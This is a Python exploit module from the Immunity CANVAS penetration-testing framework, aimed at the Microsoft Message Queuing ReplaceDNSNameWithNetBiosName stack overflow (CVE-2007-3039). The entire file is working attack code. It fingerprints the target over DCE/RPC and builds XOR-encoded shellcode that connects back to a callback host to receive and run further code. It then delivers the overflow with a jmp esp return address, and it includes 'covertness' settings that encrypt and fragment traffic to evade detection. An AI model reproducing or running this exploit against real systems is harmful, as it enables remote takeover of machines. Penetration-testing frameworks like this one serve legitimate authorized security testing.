#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information
#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import time
import struct
if '.' not in sys.path: sys.path.append('.')
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from shellcode import shellcodeGenerator
from encoder import xorencoder
from MOSDEF import mosdef
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libdcerpc import s_dce_raw_unistring

NAME='Microsoft Message Queuing Service Overflow'
DESCRIPTION='Microsoft Message Queuing Service ReplaceDNSNameWithNetBiosName() Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='12/11/07'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms07-065.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['CVE Name'] = 'CVE-2007-3039'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3039'
DOCUMENTATION['CVSS'] = 9.0
DOCUMENTATION['Note']='''

Windows XP needs a valid Username and Password.

According to the SWI Weblog:
"
There is actually another mitigating factor present here that we didn't
include in the bulletin because we could not authoritatively say that it was
true in every case. The vulnerable code path only executes if your machine has
a primary DNS suffix. Most of the time, only domain-joined machines have a
primary DNS suffix. So it would have been great to say in the bulletin:
"Machines not joined to a domain are safe" but that is not 100% accurate so we
did not include that. Technically, an administrator could manually set a
primary DNS suffix on a non-domain-joined machine.
"

For information on how to set this up to test this exploit if you don't want
to be on a domain:
http://www.windowsitpro.com/Article/ArticleID/15282/15282.html

You will, of course, first have to into Windows Add/Remove programs and add it
as a "Windows component".

'''
DOCUMENTATION['CVE']='CVE-2007-3039'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV']='MS07-065'

CHANGELOG="""
"""

NOTES="""


"""

targets={
    0: ['Autoversioning',0],
    1: ['Windows 2000',0x002b5028], #jmp esp
    #2: ['Windows XP [NOT DONE YET]',0x42424242]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.port           = 2103
        self.version        = 0
        self.badstring      = '\0\xff'
        self.myDCE          = None
        self.connectionList = []
        self.subesp         = 0
        self.covertness     = 0
        self.listenerArgsDict['fromcreatethread']=1

    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def test(self):
        self.getArgs()
        if self.connect():
            return self.testOS()

        self.log('Test failed')
        return 0

    def testOS(self):
        if self.QMMgmtGetInfo():
            return 1
        return 0

    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.user = self.argsDict.get('user', self.user)
        self.password = self.argsDict.get('password', self.password)

        if self.version == 0: #we don't want result of testOS to be overwritten
            self.version = int(self.argsDict.get('version', self.version))

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0})
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port': self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread', None)
        rawshellcode=sc.get()
        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        ret=encoder.find_key(rawshellcode)
        if ret == 0:
            self.log('Could not find a key for this shellcode!')
            raise Exception,'No shellcode generated'
        self.shellcode=encoder.encode(rawshellcode)
        if self.shellcode=='':
            raise Exception,'No shellcode generated'
        self.log('Xor key used: %x'%(encoder.getkey()))
        self.log('Length of shellcode=%s'%(len(self.shellcode)))
        subesp="""xorl   %eax,%eax
movb   $0x8,%ah
subl   %eax,%esp
"""
        self.shellcode = mosdef.assemble(subesp,'x86') + self.shellcode
        return self.shellcode

    def getNetbiosName(self):
        self.serverNBname=''
        self.serverDNSname=''
        request='\x05\x00\x0b\x07\x10\x00\x00\x00\x60\x00\x10\x00\x01\x00\x00\x00\xd0\x16\xd0\x16\x00\x00'+\
                '\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xe0\x8e\x20\x41\x70\xe9\xd1\x11\x9b\x9e\x00\xe0\x2c'+\
                '\x06\x4c\x39\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60'+\
                '\x02\x00\x00\x00\x0a\x05\x00\x00\x50\x70\x15\x00\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00'+\
                '\x00\x97\x82\x08\xe0'
        if ':' in self.host:
            s = self.gettcpsock(AF_INET6=1)
        else:
            s = self.gettcpsock()
            
        s.connect((self.host,self.port))
        s.sendall(request)
        response=s.recv(1024)
        if response[2]!='\x0c':
            raise Exception,'Bind request failed to MqSvc service port'

        ntlmSppPacket=response[response.find('NTLMSS'):]
        ntlmSppChall=struct.unpack('@8sLHHLL8s8sHHL',ntlmSppPacket[:48])
        list=ntlmSppPacket[ntlmSppChall[0xa]:]
        i=0
        while i<ntlmSppPacket[0x9]:
            entry=struct.unpack('@HH',list[i:i+4])
            if entry[0]==0x0000:
                break
            if entry[0]==0x0002:
                self.log('Domain Netbios name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
            if entry[0]==0x0001:
                self.log('Server Netbios name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
                self.serverNBname=list[i+4:i+4+entry[1]]
            if entry[0]==0x0003:
                self.log('Server DNS name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
                self.serverDNSname=list[i+4:i+4+entry[1]]
            if entry[0]==0x0004:
                self.log('Domain DNS name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
            i+=4+entry[1]
        if len(self.serverNBname)==0 or len(self.serverDNSname)==0:
            raise Exception,'Couldn\'t retrieve Server Netbios name or DNS name'

    def connect(self):
        connectionList=self.buildConnectionList()
        res = None
        
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
    
        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote service')
            return 0

        self.log('Attacking %s' % self.host)
        return 1

    def connect_2(self):
        connectionList=self.buildConnectionList_2()
        res = None
        
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
    
        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)
                
        if not res:
            self.log('Could not connect to remote service')
            return 0
            
        self.log('Attacking %s' % self.host)
        return 1
    
    def buildConnectionList_2(self):
        self.UUID='fdb3a030-065f-11d1-bb9b-00a024ea5525'
        self.uuidversion='1.0'
        self.connectionList=['ncacn_ip_tcp:%s[%d]'%(self.host,self.port)]
        return self.connectionList

    def buildConnectionList(self):
        self.UUID='41208ee0-e970-11d1-9b9e-00e02c064c39'
        self.uuidversion = '1.0'
        self.connectionList=['ncacn_ip_tcp:%s[%d]'%(self.host,self.port)]
        return self.connectionList

    def QMObjectPathToObjectFormat(self):
        description,eip=targets[self.version]
        packet=''
        data=''
        data+=self.serverDNSname+'\\\0'
        data+='A'*(0x11c-len(self.serverNBname)-2)
        data+=struct.pack('<L',0x7ffdf304) #witeable address
        data+='B'*0x10
        data+=struct.pack('<L',eip)
        data+='C'*0x8
        data+=self.shellcode
        if len(data)%2!=0:
            data+='C'
        packet+=s_dce_raw_unistring(data)
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<L',1)
        packet+='\0'*4
        #print repr(packet)
        self.log('QMObjectPathToObjectFormat')
        self.myDCE.dcerpc_connection.s.set_timeout(10*60)
        self.myDCE.call(0xc, packet, response=False)

    def QMMgmtGetInfo(self):
        packet=''
        packet+=struct.pack('<H',1)
        packet+=struct.pack('<LH',1,0)
        packet+=struct.pack('<LL',1,1)
        packet+=struct.pack('<HBBLLLH',5,0,0,1,1,0,1)
        self.log('QMMgmtGetInfo')
        self.myDCE.dcerpc_connection.s.set_timeout(10*60)
        self.myDCE.call(0x0, packet, response=True)
        response = self.myDCE.reassembled_data
        self.log('QMMgmtGetInfo response')
        try:
            if int(response)==0:
                raise Exception,'QMMgmtGetInfo request failed!'
        except:
            pass
        #print prettyprint(response)
        if len(response)<(0x24+0x10):
            raise Exception,'QMMgmtGetInfo response too short!'
        id=unicode2ascii(response[0x24:])
        #self.log('%s'%(prettyprint(id)))
        self.version=0
        if id.find('2195, x86')!=-1:
            self.log('Remote OS: Windows 2000')
            self.version=1
        elif id.find('2600, x86')!=-1:
            self.log('Remote OS: Windows XP')
            #self.version=2 #NOT DONE YET
        else:
            self.log('Remote OS: Unknown')
            return 0
        return 1

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port),showlog=True)
        try:
            self.log('Getting netbios name')
            self.getNetbiosName()
            if self.serverDNSname.count('.')==0:
                self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
                self.log('Machine has no primary DNS suffix')
                return 0
            self.setProgress(25)
            self.log('Connecting...')
            self.connect()
            self.log('Testing for OS')
            if not self.testOS() or self.version==0:
                raise Exception,'OS detection failed.'
            self.setProgress(50)
            self.log('Connecting again')
            self.connect_2()
            self.setProgress(75)
            self.QMObjectPathToObjectFormat()
            self.setProgress(100)
        except Exception,msg:
            self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
            if str(msg).count('10061'):
                msg='Connection refused'
            self.log('Failed reason: %s'%(prettyprint(str(msg))))
            return 0
        time.sleep(5)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(self.name,self.host,self.port),showlog=True)
            self.log('%s done (succeeded!)'%(self.name))
            return 1
        self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s done (failed)'%(self.name))
        return 0

    def usage(self):
        print 'Usage: %s -t host -l localIP -d localPort [-T: testmode]'%(sys.argv[0])
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
